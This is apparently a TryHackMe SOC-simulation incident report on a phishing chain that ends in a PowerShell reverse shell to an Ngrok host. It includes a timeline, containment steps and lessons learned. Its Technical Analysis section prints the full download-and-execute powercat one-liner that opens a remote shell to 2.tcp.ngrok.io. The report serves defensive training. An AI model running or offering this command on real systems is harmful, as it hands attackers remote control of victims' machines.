# TryHackMe SOC Simulation: Phishing Incident Response Report

## Summary

This document outlines the investigation and response to a phishing incident analyzed during a TryHackMe SOC simulation. The simulation involved tracking down the origin of a suspicious PowerShell script, identifying lateral movement via internal email, and uncovering the establishment of a reverse shell through a common tunneling service.

## Scenario Overview

- Platform: TryHackMe SOC Simulation
- Date: March 25th, 2025
- Primary Incident: Internal phishing email with a script-based attachment
- Affected users: Michelle Smith, Yani Zubair, Michael Ascot
- Key file: forceupdate.ps1
- Communication with: 2.tcp.ngrok.io on port 19282

## Alert Breakdown

### Alert ID 1004
- Description: Suspicious attachment found in an internal email
- Sender: yani.zubair@tryhatme.com
- Recipient: michelle.smith@tryhatme.com
- Attachment: forceupdate.ps1
- Subject: Force update fix
- Classification: False Positive

Although this alert flagged Yani as the origin of the malicious attachment, further investigation showed that Michelle Smith had downloaded the file from the internet and forwarded it. Yani’s message was a reply or internal transfer of the already known script. Therefore, this alert did not represent a new threat and is considered a false positive.

### Alert ID 1007
- Description: Suspicious attachment in internal email
- Sender: michelle.smith@tryhatme.com
- Recipient: yani.zubair@tryhatme.com
- Attachment: forceupdate.ps1
- Subject: Force update fix
- Classification: True Positive

This was the actual point of concern. Michelle downloaded the PowerShell script using Internet Explorer, and shortly after, forwarded it to Yani. This activity marked the beginning of the malicious file's spread.

## Timeline of Events

- 05:41:51 - Alert triggered for internal email with PowerShell attachment
- 06:03:56 - Michelle downloaded forceupdate.ps1 using Internet Explorer
- 06:04:52 - Yani received a forwarded phishing email from an external sender
- 06:06:34 - Michael opened a ZIP file named ImportantInvoice-Febrary.zip
- 06:06:42 - DNS queries were made to raw.githubusercontent.com
- 06:06:50 - PowerShell reverse shell executed using powercat.ps1
- 06:06:53 - Outbound connection established to 2.tcp.ngrok.io:19282

## Technical Analysis

Michelle Smith, the initial victim, downloaded a file named forceupdate.ps1. She then sent it to Yani Zubair in an internal email. The script was later executed by Michael Ascot after he opened a phishing ZIP file, which likely contained a disguised shortcut file. PowerShell was used to download and execute the payload.

The attacker leveraged a publicly available script (powercat.ps1) hosted on GitHub. Once executed, it created a reverse shell back to an Ngrok tunnel.

PowerShell command executed:
```
IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell
```

DNS queries confirmed the host reached out to both raw.githubusercontent.com and the Ngrok endpoint.

## Containment and Response

The following steps were taken to contain the incident:

- Isolated the infected hosts (win-3450 and win-3459)
- Reset credentials for Michelle, Yani, and Michael
- Blocked outbound access to *.ngrok.io
- Deleted forceupdate.ps1 and the associated ZIP files from user directories
- Created detection rules in Splunk for PowerShell using WebClient, and for .ps1 or .lnk files inside compressed archives
- Conducted a follow-up phishing awareness session for users

## Conclusion

This was a confirmed phishing incident that led to the execution of a reverse shell using PowerShell. The original infection began when Michelle Smith downloaded a script via Internet Explorer. The script was then spread through internal email and executed through a deceptive ZIP archive, granting the attacker remote access via Ngrok.

The quick response and containment measures helped prevent further spread. It also highlighted the importance of monitoring internal email traffic and controlling the use of script-based attachments within the organization.

## Lessons Learned

- Internal email is not immune to phishing tactics and should be monitored.
- Blocking or sandboxing script-based attachments can prevent early compromise.
- PowerShell telemetry is critical for detecting live attacks.
- External tunneling services like Ngrok should be reviewed and potentially blocked to reduce risk.
